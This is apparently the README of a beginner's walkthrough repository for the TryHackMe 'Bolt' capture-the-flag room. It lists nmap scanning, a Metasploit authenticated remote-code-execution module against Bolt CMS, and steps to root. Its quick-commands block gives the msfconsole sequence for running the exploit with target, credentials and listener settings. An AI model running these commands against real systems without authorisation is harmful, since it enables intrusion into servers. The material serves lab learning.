# 🐕 TryHackMe Bolt Room - Complete Walkthrough

> **Beginner Friendly Guide** 🌟
> 
> I just completed the Bolt room on TryHackMe! This guide shows everything I did step-by-step.

---

## 📋 Room Info

| 🏷️ Detail | 📋 Value |
|:----------:|:---------|
| **Room Name** | Bolt 🐕 |
| **Platform** | [TryHackMe](https://tryhackme.com) |
| **Difficulty** | 🟢 Easy |
| **Time** | ~45 minutes |
| **Status** | ✅ Completed |

---

## 🗺️ What I Did (Step by Step)

```
🎯 Step 1: Scan ports with Nmap
    ↓
🕵️ Step 2: Find the website and login page
    ↓
💥 Step 3: Use Metasploit to hack in!
    ↓
🏴 Step 4: Look around and find flags
    ↓
👑 Step 5: Become root (admin)
    ↓
🏆 Step 6: Get all flags!
```

---

## 📁 What's Inside This Repo

```
📂 tryhackme-bolt-room/
│
├── 📄 README.md              ← You are here!
├── 📄 LICENSE
│
├── 📁 01-reconnaissance/     ← How I scanned the target
├── 📁 02-enumeration/        ← How I found the website
├── 📁 03-exploitation/       ← How I used Metasploit
├── 📁 04-post-exploitation/  ← How I found flags
├── 📁 05-privilege-escalation/ ← How I became root
├── 📁 06-flags/              ← All flags I found
│
├── 📁 scripts/               ← Useful scripts
└── 📁 screenshots/           ← Where to add your screenshots
```

---

## 🛠️ Tools I Used

| Tool | What It Does |
|------|-------------|
| **Nmap** | Finds open ports |
| **Browser** | Looks at websites |
| **Metasploit** | Does the hacking |
| **Netcat** | Gets a shell |

---

## 🚀 Quick Commands

```bash
# 1. Scan the target
nmap -sV -sC <TARGET_IP>

# 2. Start Metasploit
msfconsole -q

# 3. Search for Bolt exploit
search bolt_authenticated_rce

# 4. Use the exploit
use 0

# 5. Set options and run
set RHOSTS <TARGET_IP>
set USERNAME <found_username>
set PASSWORD <found_password>
set LHOST <YOUR_IP>
exploit
```

---

## 📖 Full Walkthrough

| Step | What I Did | Link |
|:----:|:-----------|:----:|
| 1 | 🔍 Scanning | [01-reconnaissance](01-reconnaissance/) |
| 2 | 🕵️ Finding the website | [02-enumeration](02-enumeration/) |
| 3 | 💥 Using Metasploit | [03-exploitation](03-exploitation/) |
| 4 | 🏴 Finding stuff | [04-post-exploitation](04-post-exploitation/) |
| 5 | 👑 Becoming root | [05-privilege-escalation](05-privilege-escalation/) |
| 6 | 🏆 All flags | [06-flags](06-flags/) |

---

## ⚠️ Important Note

> This is for **learning only**! 
> 
> Only hack systems you **own** or have **permission** to test!

---

This is my walkthrough of the Bolt room. I hope it helps other beginners!

⭐ Star this repo if it helped you!
